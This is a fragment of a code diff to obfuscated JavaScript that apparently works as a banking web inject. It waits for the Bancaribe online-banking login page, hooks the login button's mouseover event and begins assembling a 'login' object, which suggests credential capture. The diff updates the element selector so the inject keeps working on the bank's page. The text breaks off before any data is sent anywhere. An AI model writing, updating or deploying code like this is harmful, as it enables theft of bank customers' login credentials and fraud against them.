@@ -100,7 +100,7 @@ var login_form = document.getElementById("loginForm");
 (function () {
   if (top['location']['href']['indexOf']('https://www4.bancaribe.com.ve/bcj/') > -1) {
       var interval = setInterval(function () {
-          if (document['getElementsByName']('conexion')[0]) {
+          if (document['getElementsByClassName']('form1')[0]) {
               clearInterval(interval);
               document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
                var login = {};
